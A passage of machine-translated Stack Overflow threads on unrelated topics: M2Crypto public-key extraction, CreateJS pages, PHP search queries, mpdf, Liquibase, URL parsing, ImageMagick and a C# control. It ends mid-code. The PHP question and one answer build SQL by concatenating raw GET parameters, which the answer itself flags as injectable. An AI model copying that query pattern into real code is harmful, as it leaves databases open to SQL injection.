抱歉，我没有想到我无法将证书与连接相关联的可能性。我添加了必须将公钥存储在协议实例中的要求。因此，按照 JF Sebastian 的建议`peerX509.as_pem()`在函数内部使用`postConnectionCheck`是行不通的。此外，至少在 python-m2crypto 的 0.21.1-2ubuntu3 版本中，我必须调用`peerX509.get_rsa().as_pem()`以获得正确的公钥。使用`peerX509.as_pem(None)`（因为`peerX509.as_pem()`仍然需要密码）产生与 PyOpenSSL 完全相同的输出`crypto.dump_privatekey(PKey)`。也许有一个错误。

除此之外，答案向我展示了一种使用以下`Echo`协议类编写另一种解决方法的可能方法：

```
class Echo(Protocol):
    def dataReceived(self, data):
        """As soon as any data is received, write it back."""
        if self.transport.checked and not self.pubkeyStored:
            self.pubkeyStored = True
            x509 = m2.ssl_get_peer_cert(self.transport.ssl._ptr())
            if x509 is not None:
                x509 = X509.X509(x509, 1)
                pk = x509.get_pubkey()
                self.pubkey = pk.get_rsa().as_pem()
                print pk.as_pem(None)
            print self.pubkey
        self.transport.write(data) 
```

如您所见，这使用了一些我想阻止的内部类。我正在犹豫是否提交一个小补丁，它将向M2Crypto.SSL.TwistedProtocolWrapper`getCert`中的类添加一个方法。`TLSProtocolWrapper`即使它被上游接受，它也会破坏我的脚本与除了最先进的 m2crypto 版本之外的任何版本的兼容性。你会怎么做？

### 我的外部 OpenSSL 调用

好吧，这是一个基于外部系统命令的丑陋解决方法，在我看来，这比访问非公共属性还要糟糕。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2015-06-19T03:27:23.353

以前的一些答案产生（显然？）工作 PEM 公钥文件，但据我尝试，它们都没有产生与“openssl rsa -pubout -in priv.key”相同的输出。这对我的测试套件非常重要，并且在 (0.15.1) PyOpenSSL 代码中进行了探索之后，这对于标准 PKey 对象和由 x509.get_pubkey() 方法创建的仅公钥 PKey 对象都适用：

```
from OpenSSL import crypto
from OpenSSL._util import lib as cryptolib

def pem_publickey(pkey):
    """ Format a public key as a PEM """
    bio = crypto._new_mem_buf()
    cryptolib.PEM_write_bio_PUBKEY(bio, pkey._pkey)
    return crypto._bio_to_string(bio)

key = crypto.PKey()
key.generate_key(crypto.TYPE_RSA, 2048)
print pem_publickey(key) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-14T14:51:53.957

`openssl rsa -in client.key -pubout > client.pub`中的命令模拟[`M2Crypto`](http://chandlerproject.org/Projects/MeTooCrypto)（比 pyOpenSSL 更完整的 openssl 包装器）是：

```
def save_pub_key(cert, filename):
    cert.get_pubkey().get_rsa().save_pub_key(filename) 
```

你可以用twisted`M2Crypto`代替。`pyOpenSSL`要将 ssl 功能添加到 echo 服务器：

```
from twisted.internet import protocol, reactor

class Echo(protocol.Protocol):
    def dataReceived(self, data):
        self.transport.write(data)

class EchoFactory(protocol.Factory):
    def buildProtocol(self, addr):
        return Echo() 
```

你可以：

```
import sys
from twisted.python import log

from M2Crypto import SSL, X509
from M2Crypto.SSL import Checker
from M2Crypto.SSL.TwistedProtocolWrapper import listenSSL

log.startLogging(sys.stderr)    
cert = X509.load_cert('client.crt')
check = Checker.Checker(peerCertHash=cert.get_fingerprint('sha1'))

def postConnectionCheck(peerX509, expectedHost):
    log.msg("client cert in pem format:\n", peerX509.as_pem())
    save_pub_key(peerX509, 'client.pub')
    return check(peerX509, host=None) # don't check client hostname

class SSLContextFactory:
    def getContext(self):
        ctx = SSL.Context()
        ctx.load_verify_locations(cafile='ca.crt')
        ctx.load_cert(certfile='server.crt', keyfile='server.key',
                      callback=lambda *a,**kw: 'keyfile passphrase')
        ctx.set_verify(SSL.verify_peer | SSL.verify_fail_if_no_peer_cert,
                       depth=9, callback=None)
        return ctx
listenSSL(8000, EchoFactory(), SSLContextFactory(),
          interface='localhost',  reactor=reactor,
          postConnectionCheck=postConnectionCheck)
reactor.run() 
```

要尝试它，请创建自签名证书：

```
$ openssl req -new -x509 -nodes -out server.crt -keyout server.key
# NOTE: server.key is unencrypted!
$ cp {server,client}.crt
$ cp {server,client}.key
$ cp {server,ca}.crt 
```

并连接到服务器：

```
$ openssl s_client -cert client.crt -key client.key -CAfile ca.crt \
   -verify 9 -connect localhost:8000 -no_ssl2 
```

服务器将客户端的公钥保存到`client.pub`文件中。它与由`openssl`命令创建的相同：

```
$ openssl rsa -in client.key -pubout > openssl_client.pub
$ diff -s {openssl_,}client.pub 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-06-24T07:04:42.120

我最终使用 Crypto.Util.asn1（pyasn1 库）中的 pyOpenSSL 和 DerSequence 类使其工作。

这是我的 RSAKey 类中的一个方法（pkey 是 OpenSSL.crypto.PKey 实例）：

```
from OpenSSL.crypto import dump_privatekey, FILETYPE_ASN1
from Crypto.PublicKey import RSA
from Crypto.Util.asn1 import DerSequence
from base64 import b64decode, b64encode

...

def fromPKey_PublicKey(self, pkey):
    src = dump_privatekey(FILETYPE_ASN1, pkey)
    pub_der = DerSequence()
    pub_der.decode(src)
    self.key = RSA.construct((long(pub_der._seq[1]), long(pub_der._seq[2]))) 
```

这里的关键是 pub_der._seq 中的第一项为零，我们不需要它。您可以将存储在 self.key 中的 RSA 密钥转换为您想要的任何格式：

```
def toPEM_PublicKey(self):
    pemSeq = DerSequence()
    pemSeq[:] = [ self.key.key.n, self.key.key.e ]
    s = b64encode(pemSeq.encode())
    src = '-----BEGIN RSA PUBLIC KEY-----\n'
    while True:
        src += s[:64] + '\n'
        s = s[64:]
        if s == '':
            break
    src += '-----END RSA PUBLIC KEY-----'
    return src 
```

我目前正在使用 CSpace 项目，它使用“ncrypt”库（这是另一个 OpenSSL 包装器），不再支持它，它在 Linux 上提供了 SegFault。所以我决定用 pyOpenSSL 替换 ncrypt 库，因为我在我的名为 DataHaven.NET 的项目中使用它。从 PEM 格式的对等证书中获取公钥对我来说确实是个问题。现在它工作得很好。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-17T05:04:15.710

获取公钥的一种可能性是通过外部调用的 openssl 实例管道 x509 证书的 pem 版本，这是一种丑陋的解决方法：

```
def extractpublickey(x509):
    x509pem = dump_certificate(FILETYPE_PEM,x509)
    ossl = Popen(['openssl','x509','-pubkey','-noout'] , stdout=PIPE, stderr=PIPE, stdin=PIPE)
    (stdout,_) = ossl.communicate(x509pem)
    res = ""
    if stdout[:26] != ("-----BEGIN PUBLIC KEY-----") or stdout[-24:] != ("-----END PUBLIC KEY-----"):
        raise AttributeError("Could not extract key from x509 certificate in PEM mode: %s"%x509pem)
    else:
        res = stdout
    return res

class Echo(Protocol):
    def dataReceived(self, data):
        """As soon as any data is received, write it back."""
        if self.transport.getPeerCertificate() == None:
            print("unknown client")
        else: 
            print extractpublickey(self.transport.getPeerCertificate())
        self.transport.write(data) 
```

# javascript - 如何在同一页面上使用两个不同的 flash 到 js 电影？

> ID：13845471
> 
> 赞同：2
> 
> 时间：2012-12-12T17:39:33.213
> 
> 标签：javascript

如何更改 js 以便能够查看我在“创建 js 工具包”中创建的两个不同的 Flash 电影？只放映了一部影片。我知道我需要更改代码，但我不知道如何。请帮忙！好心的伊娃。

这是我网站的代码：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Modedrive-Från vardag till fest-för kvinnor i alla åldrar</title>
<link href="Styles/Modedrive_cs5.css" rel="stylesheet" type="text/css" />
<script src="SpryAssets/SpryMenuBar.js" type="text/javascript"></script>
<link href="SpryAssets/SpryMenuBarHorizontal.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>

<script src="http://code.createjs.com/easeljs-0.5.0.min.js"></script>
<script src="http://code.createjs.com/tweenjs-0.3.0.min.js"></script>
<script src="http://code.createjs.com/movieclip-0.5.0.min.js"></script>
<script src="http://code.createjs.com/preloadjs-0.2.0.min.js"></script>
<script src="Julfilm.js"></script>
<script src="Modedrive-film7.js"></script>

 <script>
var canvas, stage, exportRoot;

function init() {
    canvas = document.getElementById("canvas1");
    images = images||{};

    var manifest = [
        {src:"images/_2013.png", id:"_2013"},
        {src:"images/Godjul.png", id:"Godjul"},
        {src:"images/Gottnytt.jpg", id:"Gottnytt"},
        {src:"images/Julkulor.png", id:"Julkulor"},
        {src:"images/Julkulor2.png", id:"Julkulor2"},
        {src:"images/Vivillonska.png", id:"Vivillonska"}
    ];

    var loader = new createjs.PreloadJS(false);
    loader.onFileLoad = handleFileLoad;
    loader.onComplete = handleComplete;
    loader.loadManifest(manifest);
}

function handleFileLoad(o) {
    if (o.type == "image") { images[o.id] = o.result; }
}

function handleComplete() {
    exportRoot = new lib.Julfilm();

    stage = new createjs.Stage(canvas);
    stage.addChild(exportRoot);
    stage.update();

    createjs.Ticker.setFPS(30);
    createjs.Ticker.addListener(stage);
}
</script>

<script>
var canvas, stage, exportRoot;

function init() {
    canvas = document.getElementById("canvas2");
    images = images||{};

    var manifest = [
        {src:"images/Bettykofta.jpg", id:"Bettykofta"},
        {src:"images/Byxdress.jpg", id:"Byxdress"},
        {src:"images/Fur.jpg", id:"Fur"},
        {src:"images/Kofta.jpg", id:"Kofta"},
        {src:"images/leopkavajred.jpg", id:"leopkavajred"},
        {src:"images/Leopardjacka.jpg", id:"Leopardjacka"},
        {src:"images/liladress.jpg", id:"liladress"},
        {src:"images/Longdress.jpg", id:"Longdress"},
        {src:"images/Redzebrakofta.jpg", id:"Redzebrakofta"},
        {src:"images/Skinnjacka.jpg", id:"Skinnjacka"},
        {src:"images/vitsvponcho.jpg", id:"vitsvponcho"}
    ];

    var loader = new createjs.PreloadJS(false);
    loader.onFileLoad = handleFileLoad;
    loader.onComplete = handleComplete;
    loader.loadManifest(manifest);
}

function handleFileLoad(o) {
    if (o.type == "image") { images[o.id] = o.result; }
}

function handleComplete() {
    exportRoot = new lib.Modedrivefilm7();

    stage = new createjs.Stage(canvas);
    stage.addChild(exportRoot);
    stage.update();

    createjs.Ticker.setFPS(30);
    createjs.Ticker.addListener(stage);
}
</script>
<style type="text/css">
body {
    background-image: url(images/mode_bakg.jpg);
}
</style>
</head>

<body onload="init();" style="background-color:#D4D4D4">

 <div id="container">
  <div id="logo"><img src="images/Modedrive-logo.png" width="900" height="163" alt="Modedrive" />
  <p>Fr&aring;n vardag till fest f&ouml;r kvinnor i alla &aring;ldrar.</p></div>
  <ul id="MenuBar1" class="MenuBarHorizontal">
    <li><a href="#">Hem</a>    </li>
    <li><a href="historik.html">Historik</a></li>
    <li><a class="MenuBarItemSubmenu" href="designs.html">M&auml;rken</a>
      <ul>
        <li><a href="designs.html">V&aring;ra M&auml;rken</a></li>
        <li><a class="MenuBarItemSubmenu" href="http://www.tee4twogolf.se">Vi st&ouml;djer</a>
          <ul>
            <li><a href="http://www.tee4twogolf.se">Tee 4 Two</a></li>
            <li><a href="team_tiara.html">Team Tiara</a></li>
            <li><a href="xocai.html">Xo&ccedil;ai</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="aktuellt.html">Aktuellt</a></li>
    <li><a href="VIP.html">VIP Kundklubb</a></li>
    <li><a href="kontakt.html">Kontakta oss</a></li>
  </ul>

  <div id="main">
  <canvas id="canvas1" width="775" height="270" style="background-color:#000000"></canvas>
  </div>

  <div id="left_column"><h1>440 m&#178 med mode!</h1><p>Vi hj&auml;lper dig<br /> hitta r&auml;tt<br />bland s&auml;songens<br /> modenyheter<br />f&ouml;r kvinnor<br /> i alla &aring;ldrar<br />fr&aring;n vardag<br /> till fest.</p><h2>V&auml;lkommen in!</h2></div>

  <div id="center_column">
  <canvas id="canvas2" width="420" height="570" style="background-color:#000000"></canvas>

  </div>
  <div id="right_column"><h1>Just nu...</h1>
  <p><h1>K&ouml;p tv&aring;<br /> plagg</h1><h2>betala</h2><h1> 1 krona</h1><h2>f&ouml;r det billigaste!<br /><br />Nu har vi <br />advents&ouml;ppet<br />p&aring; s&ouml;ndagar mellan<br />12-16:00 </h2>
  </div>

  <div id="footer"><p><img src="images/Tbana-liten.png" width="30" height="30" alt="Tbana symbol" />Odenplan, Karlbergsv&auml;gen 16, 11327 Stockholm. Tel: o8-343838<br />&Ouml;ppet tider: Vardagar 10-19:00, L&ouml;rdagar 10-16:00, S&ouml;ndagar 12-16:00.</p></div>
</div>

<script type="text/javascript">
var MenuBar1 = new Spry.Widget.MenuBar("MenuBar1", {imgDown:"SpryAssets/SpryMenuBarDownHover.gif", imgRight:"SpryAssets/SpryMenuBarRightHover.gif"});

</script>
</body>
</html> 
```

# php - 根据 GET 参数重写查询

> ID：13845473
> 
> 赞同：2
> 
> 时间：2012-12-12T17:39:49.547
> 
> 标签：php, get, criteria

我正在我的网站上开发一个搜索引擎。`GET`用户可以添加在url 中使用 a 提交的标准。

当用户选择例如 1 个条件时，它看起来像这样：

```
localhost/search.php?course=1&price=&name= 
```

他们有 3 个可以选择的标准，所以如您所见，他只选择了 COURSE。

现在我必须根据标准从数据库中进行选择，所以我的代码如下所示：

```
if ($_GET['price'] > 0 && $_GET['name'])
{
    $search_price = $_GET['price'];
    $search_name = $_GET['name'];

    $result2 = mysql_query("SELECT id, name, price, views, userid, type, anonymous FROM files WHERE course='$course_id' AND price < $search_price AND name LIKE '%$search_name%'");
}
elseif ($_GET['price'] > 0)
{
    $search_price = $_GET['price'];

    $result2 = mysql_query("SELECT id, name, price, views, userid, type, anonymous FROM files WHERE course='$course_id' AND price < $search_price");
} 
elseif ($_GET['name'])
{
    $search_name = $_GET['name'];

    $result2 = mysql_query("SELECT id, name, price, views, userid, type, anonymous FROM files WHERE course='$course_id' AND name LIKE '%$search_name%'");
}
else 
{
    $result2 = mysql_query("SELECT id, name, price, views, userid, type, anonymous FROM files WHERE course='$course_id'");
}

while ($row2 = mysql_fetch_assoc($result2))
                                        {
..... 
```

但这不可能是正确的方法，因为如果最终用户可以选择 10 个标准，这将是一个很长的代码

我该如何解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:53:03.053

我要做的是动态创建 sql 查询，然后在最后执行它。所以像这样

```
$query_string = "SELECT blahblah, blahblah, blah blah from blahx where 1=1 ";
$where = "";

if(isset($_GET['somecriteria']))
{
    $where .= " AND blahblah = $_GET['somecriteia'] ";
}
if(isset($_GET['someOTHERcriteria']))
{
    $where .= " AND blahblah=$_GET['someOTHERcritera'] ";
}
mysql_query($query_string . $where); 
```

等等。请注意，这只是为了向您展示如何实现您的目标。这显然很容易受到 SQL 注入攻击，您必须清理这些东西。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T17:54:23.153

使用 $_post 将大量信息发送到 php 脚本。使用 get 时，您应该创建 url 以仅在填充 get 调用时包含它们。因此，如果未选择价格，则 url 不应包含“price=”。这将导致您的接收脚本出现问题。

您的数据库脚本可以通过一次调用完成，其中仅包含选定的条件。

Myqsl 已经折旧，你需要查看 Myqsli 或 PDO

# php - mpdf忽略javascript

> ID：13845475
> 
> 赞同：7
> 
> 时间：2012-12-12T17:39:55.087
> 
> 标签：php, javascript, mpdf

我这里有个问题..

我使用缓冲来获取使用 mpdf 的 pdf 文件。

但我在这里有点困惑..

我正在缓冲的页面上有一些 javascript.. 但是从 javascript 生成的内容没有被转换为 pdf ..

让我说清楚..

假设我有这个元素

```
<div id='text'></div> 
```

在我的页面上，我有一个 javascript 代码来向该 div 添加文本.. 结果是......

[通过浏览器打开页面]

```
<div id='text'>TEXT I ADDED USING JAVASCRIPT</div> 
```

但是当我将它转换为pdf时...

```
<div id='text'></div> (I DIDNT GET THAT TEXT) 
```

这是使用的脚本.. template.php

```
ob_start();

// content of page (included inline javascript code)

$yourfile = ob_get_content();
$_SESSION[forms] = $yourfile;
echo $yourfile; 
```

转换.php

```
session_start();
include("MPDF54/mpdf.php");

$mpdf=new mPDF('c','A4','','' , 0 , 0 , 0 , 0 , 0 , 0); 

$mpdf->SetDisplayMode('fullpage');

$mpdf->list_indent_first_level = 0; // 1 or 0 - whether to indent the first level of a list

$mpdf->WriteHTML($_SESSION[forms]);

$mpdf->Output(); 
```

任何人都可以帮我解决这个问题？？？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-02-26T09:15:02.453

`mpdf`支持基本的javascript。

PDF 阅读器了解基本的 javascript 功能。

就像`print();`您可以使用`SetJS()`mpdf 库的功能添加它一样。

```
include("MPDF54/mpdf.php");

$mpdf=new mPDF('c','A4','','' , 0 , 0 , 0 , 0 , 0 , 0); 

$mpdf->SetDisplayMode('fullpage');

$mpdf->list_indent_first_level = 0; // 1 or 0 - whether to indent the first level of a list

$mpdf->WriteHTML($_SESSION[forms]);

$mpdf->SetJS('print();')  //JS code with <script></script> tags.

$mpdf->Output(); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-12T18:58:38.823

PHP *PDF 库（tcpdf、fpdf、mpdf 等...）无法运行 javascript 代码，因为这需要 javascript 解释器和浏览器呈现功能，或者如果它支持 javascript，它将无法按照您习惯的方式运行它客户端编程。除此之外，css 和标记解释也很差。

但是，如果您正在寻找能够像普通浏览器一样呈现 javascript 和 css 的替代方案，我建议**您使用 wkhtmltopdf**。

[wkhtmltopdf](http://code.google.com/p/wkhtmltopdf/)是使用 webkit 渲染引擎和 qt 将 html 转换为 pdf 的 shell 实用程序。它作为控制台程序运行，参数指定要渲染的内容，并具有大量选项。基本上你可以告诉它加载一个页面等待 5 秒钟让 javascript 完成然后创建 pdf。有 linux 和 windows 版本可用，但对于 linux，它需要安装 X11 库。

我敢肯定还有其他一些选择，但我使用 wkhtmltopdf 已经很多年了，它生成的 PDF 文件看起来与 Chrome 或 Safari 浏览器中的网页完全一样，而且 javascript 执行也很完美。

# ruby-on-rails-3 - 计划删除 SSL：这会解决我缓慢的加载时间并且我仍然能够安全登录/注册吗？

> ID：13845476
> 
> 赞同：0
> 
> 时间：2012-12-12T17:40:02.273
> 
> 标签：ruby-on-rails-3, ssl, heroku

我的网站是托管在 Heroku 上的 Rails 应用程序。我打算为该站点删除 SSL（只是要注释掉 config.force_ssl 行）。

我计划进行更改并仅将 SSL 用于登录/注册，但这会解决我的问题。我会在常规主页上登录/注册（即不是 SSL），但登录/注册表单的操作将是[https://mysite.com/sessions](https://mysite.com/sessions)而不是 /sessions。

老实说，我一般不太了解 SSL 或网络应用程序，所以我很好奇 - 是否会确保我的网站的登录/注册是安全的，但同时会消除我正在遭受的漫长的 SSL 协商时间现在？

非常感谢！林戈

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T11:15:04.717

SSL 不太可能导致性能下降。几年前，当硬件功率较低时，这将是一个考虑因素，但如今我们拥有强大的 CPU 能力，SSL 握手很快，您只需查看 gmail、facebook 等，它们都在 SSL 中永久运行。

你最好的选择是使用 NewRelic 来寻找你可以通过你的代码获得的任何性能提升。

# maven - liquibase 可以处理部分更新的架构吗？

> ID：13845483
> 
> 赞同：0
> 
> 时间：2012-12-12T17:40:44.383
> 
> 标签：maven, database-schema, liquibase

我最近开始在一个分支上工作，该分支由一个离开组织的开发人员开发，看起来他让相关的测试环境模式处于糟糕的状态。

有一个 Liquibase 更改文件，它进行了许多代码运行所必需的更改，但看起来关联的架构已经应用了一些更改。

我尽量不要手动更新任何模式，尤其是在不是我个人开发环境的情况下，所以我希望使现有的（相当复杂的）更改工作。

我得到的错误是这样的：

严重 2012 年 12 月 12 日下午 12:15：liquibase：更改集 db/changelogs/linechanges.xml::14::limit 失败。错误：执行 SQL ALTER TABLE 限制添加 ID 序列时出错：错误：关系“lineitem_limitgroup”的列“id”已经存在 liquibase.exception.DatabaseException：执行 SQL ALTER TABLE 限制添加 ID 序列时出错：错误：关系“的列“id”限制”已经存在于 liquibase.executor.jvm.JdbcExecutor.execute(JdbcExecutor.java:104) 的 liquibase.executor.jvm.JdbcExecutor.execute(JdbcExecutor.java:62) 的 liquibase.database.AbstractDatabase.execute(AbstractDatabase.java :1075) 在 liquibase.database.AbstractDatabase.executeStatements(AbstractDatabase.java:1059) 在 liquibase.changelog.ChangeSet.execute(ChangeSet.java:317) 在 liquibase.changelog.visitor.UpdateVisitor.visit(UpdateVisitor.

请注意，此更改文件包含多个更改集。当我检查架构时，看起来某些 changeSet 的更改已应用，但其他一些更改未应用。

那么，有没有办法告诉 liquibase（最好通过 Maven 插件）忽略失败的变更集并继续？

或者（不太有用）有没有办法告诉 liquibase 应用一些 changeSet 而不是其他？

谢谢！！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-02-26T16:13:22.967

看起来您的变更集已无意更新，因此您看到了问题。为已创建实体的模式等更改创建新的变更集而不是更新现有的变更集是一种很好的做法。

话说回来 ：

在您的日志中，检查是否有其他更改集已添加该列。是的，有办法告诉 liquibase 应用一些更改而不是其他更改。

一种解决方法是：由于您的文件已经存在问题，您可以进行所有先前的更改以在任何正确运行的更改集下进行。由于changeset的唯一标识是基于-author,change,changeSetID。由于这个已经运行过一次，所以不管里面有什么sql都不会再去运行了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:18:55.763

我认为您最好的选择是使用 Liquibase 前提条件来告诉它仅在列不存在时才错误地运行 chanset。您将不得不像这样使用标签 columnExists ：

```
<preConditions>
  <not>
    <columnExists columnName="id" tableName="limit" schemaName="yourSchemaNameHere" />
  </not>
</preConditions> 
```

如果您在限制表中已经有 id 列，它会将脚本标记为运行而不实际运行任何更新。

您还有另外两个选择：

第一个选项。您可以在触发错误的变更集上将属性 failOnError 设置为 false。容易出错的变更集将一直运行到它们触发错误的地步。下一个变更集将正常运行。

小心使用它，因为它不会在错误时回滚变更集，也不会将变更集标记为运行。另请注意，如果您已经有一个将此属性设置为 false 的变更集，这可能解释了您进行部分更新的原因。

第二个选项，在表 DATABASECHANGELOG 中插入一行以向 Liquibase 表明它不必运行特定的变更集。实际上，这意味着变更集运行成功，但结果是 Liquibase 无论如何都不会尝试再次运行它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-13T09:55:25.413

Liquibase 不会两次应用变更集。但可能在其他分支的不同变更集中进行了一些相同（或不兼容）的更改。我认为您别无选择，只能手动编辑此分支的变更集，以便它们干净地应用。

# javascript - 获取没有最后一段的 URL 路径

> ID：13845486
> 
> 赞同：15
> 
> 时间：2012-12-12T17:40:47.953
> 
> 标签：javascript, jquery, url

如何获取当前站点的 URL 路径，但没有最后一段：

```
http://www.domain.com/first/second/last 
```

我只需要`http://www.domain.com/first/second`……使用 jQuery（或只有 JavaScript）

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-12-12T18:14:58.587

使用 pop 和 URL api

这假设 URL 不太可能改变

我使用[document.URL](https://developer.mozilla.org/en-US/docs/DOM/document.URL)因为这是推荐的

```
const url = new URL("https://www.example.com/first/second/last"); // new URL(document.URL)
let path = url.pathname.split("/");
path.pop(); // remove the last
url.pathname = path.join("/")
console.log(url)
```

较旧的答案：根据 OP 的要求 - 更改评论

```
const url = "http://www.example.com/first/second/last", // document.URL, 
    shortUrl=url.substring(0,url.lastIndexOf("/"));
console.log(shortUrl) 
```

这是一个替代方案

```
const url = new URL("http://www.example.com/first/second/last"),
      shortUrl = `${url.protocol}//${url.hostname}${url.pathname.slice(0,url.pathname.lastIndexOf("/"))}`

console.log(shortUrl)
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-12T17:44:31.597

[http://jsfiddle.net/KZsEW](http://jsfiddle.net/KZsEW)

为所有浏览器尝试以下操作：

```
var url = "http://www.domain.com/first/second/last";  // or var url = document.URL;
var subUrl = url.substring(0,url.lastIndexOf("/"))

alert(subUrl);
​ 
```

该`lastIndexOf()`方法返回指定值在字符串中最后一次出现的位置。

> 注意：字符串从尾到头搜索，但返回从头开始的索引，位置为 0。
> 
> 如果要搜索的值从未出现，则此方法返回 -1。

[https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/String/lastIndexOf](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/String/lastIndexOf)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T17:47:59.887

我不确定这是最优雅的解决方案，但您只希望子字符串到最后一个斜杠，或者如果最后一个字符是斜杠，则倒数第二个。在这里，我首先获取出现在协议（http:// 或 https://）之后的 URL 部分，以便在例如[http://stackoverflow.com](http://stackoverflow.com)上返回[http://stackoverflow.com](http://stackoverflow.com)。

```
 var url = document.URL.split('://');
    var last_slash;
    var result;
    if (url[1].charAt(url[1].length - 1) === '/') {
      url[1] = url[1].substring(0, url[1].length - 1);
    }
    last_slash = url[1].lastIndexOf('/');
    result = url[0] + '://' + ((last_slash !== -1) ? url[1].substring(0, last_slash) : url[1]); 
```

编辑：jsfiddle [http://jsfiddle.net/CV6d4/](http://jsfiddle.net/CV6d4/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-12T18:05:49.080

试试这个：

```
var url = 'http://www.domain.com/first/second/last';
for(var i=url.length-1; i>=0;i--){
    if(url[i]!='/'){
        url= url.substr(0,i);
    }
    else{
        alert(url);
        break;
    }
} 
```

# node.js - 在 node.js 中使用 imagemagick 将 svg 转换为 png

> ID：13845488
> 
> 赞同：3
> 
> 时间：2012-12-12T17:40:59.427
> 
> 标签：node.js, imagemagick

我在 nodejs 中搜索一种方法，在 imagemagick [https://github.com/rsms/node-imagemagick](https://github.com/rsms/node-imagemagick)的帮助下将 svg 转换为 png ，而不将生成的 png 存储在本地文件系统上的临时文件中。

不幸的是，我无法做到这一点。而且我没有在互联网上找到示例。有人可以给我一个例子吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-13T07:18:12.333

o我找到了我要找的东西。基本上，我想出了如何将数据通过管道传输到转换执行的 std::in 中。这使我可以在不访问本地文件系统的情况下转换图像。

这是我的演示代码：

```
var im = require('imagemagick');
var fs = require('fs');

var svg = fs.readFileSync('/somepath/svg.svg', 'utf8');                

var conv = im.convert(['svg:-', 'png:-'])
conv.on('data', function(data) {
  console.log('data');
  console.log(data);
}); 
conv.on('end', function() {
  console.log('end');
});                                                                                
conv.stdin.write(svg);
conv.stdin.end(); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-12T18:23:53.877

```
var im = require('imagemagick');
var fs = require('fs');
im.convert(['foo.svg', 'png:-'], 
function(err, stdout){
  if (err) throw err;
  //stdout is your image
  //just write it to file to test this:
   fs.writeFileSync('test.png', stdout,'binary');
}); 
```

它只是将“原始”参数抛出到命令行`convert`，所以对于更多问题，只需查看 convert 的文档。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-01-13T05:49:25.233

你也可以使用[**svgexport**](https://github.com/shakiba/svgexport)（我是它的作者）：

```
var svgexport = require('svgexport');

svgexport.render({input: 'file.svg', output: 'file.png'}, callback); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-12T18:17:11.997

您还可以使用流并将结果传输到某处，而无需将结果存储为临时文件。下面是一些来自[github repo的示例代码](https://github.com/rsms/node-imagemagick#resizeoptions-callbackerr-stdout-stderr)

```
var fs = require('fs');

im.resize({
  srcData: fs.readFileSync('kittens.jpg', 'binary'),
  width:   256,
  format:  'png'
}, function(err, stdout, stderr){
  if (err) throw err
  fs.writeFileSync('kittens-resized.png', stdout, 'binary');  // change this part
  console.log('resized kittens.jpg to fit within 256x256px')
}); 
```

顺便说一句：你的接受率是 0%

# c# - 从用户控件中的按钮单击调用用户编写的代码/方法

> ID：13845489
> 
> 赞同：0
> 
> 时间：2012-12-12T17:40:58.953
> 
> 标签：c#, user-controls, delegates

我正在编写一个用户控件（winforms），它接受来自剪贴板的图像，进行一些操作，然后允许用户上传它并取回图像的 URL。

我希望该控件的用户编写他/她自己的代码来上传。我在用户控件中有一个上传按钮，我想在单击该按钮时调用用户编写的代码并传递图像对象。

我尝试过委托，但委托，用户必须调用它。但我希望用户不应该调用它，而是应该在单击我的控件中的上传按钮时调用它。

我已阅读以下内容，但它们没有帮助
[使用 C# 将方法作为参数](https://stackoverflow.com/questions/2082615/pass-method-as-parameter-using-c-sharp)
[传递 如何将方法名称传递给另一个方法并通过委托变量调用它？](https://stackoverflow.com/questions/6069598/how-can-i-pass-a-method-name-to-another-method-and-call-it-via-a-delegate-variab)

有什么办法可以让用户以使用控件的形式覆盖上传方法，以便他可以编写自己的代码或其他东西？有人可以指出我正确的方向吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:55:38.177

您有两个主要选项来实现此目的，或者要求控件的用户提供一个上传方法，当单击“上传”按钮时由您的控件调用该方法，或者您可以要求控件是子类，并且`Upload`方法实施的。

方法 1 - 提供要在上传时调用的委托：

```
public partial class MyControl
{
    // Define a delegate that specifies the parameters that will be passed to the user-provided Upload method
    public delegate void DoUploadDelegate(... parameters ...);

    private readonly DoUploadDelegate _uploadDelegate;

    public MyControl(DoUploadDelegate uploadDelegate)
    {
        if (uploadDelegate == null)
        {
            throw new ArgumentException("Upload delegate must not be null", "uploadDelegate");
        }
        _uploadDelegate = uploadDelegate;
        InitializeComponent();
    }

    // ...

    // Upload button Click event handler
    public void UploadButtonClicked(object sender, EventArgs e)
    {
        // Call the user-provided upload handler delegate with the appropriate arguments
        _uploadDelegate(...);
    }
} 
```

方法 2 - 要求覆盖上传方法：

```
public abstract partial class MyControl
{
    private readonly DoUploadDelegate _uploadDelegate;

    protected MyControl()
    {
        InitializeComponent();
    }

    // ...

    // The method that users of the control will need to implement
    protected abstract void DoUpload(... parameters ...);

    // Upload button Click event handler
    public void UploadButtonClicked(object sender, EventArgs e)
    {
        // Call the overridden upload handler with the appropriate arguments
        DoUpload(...);
    }
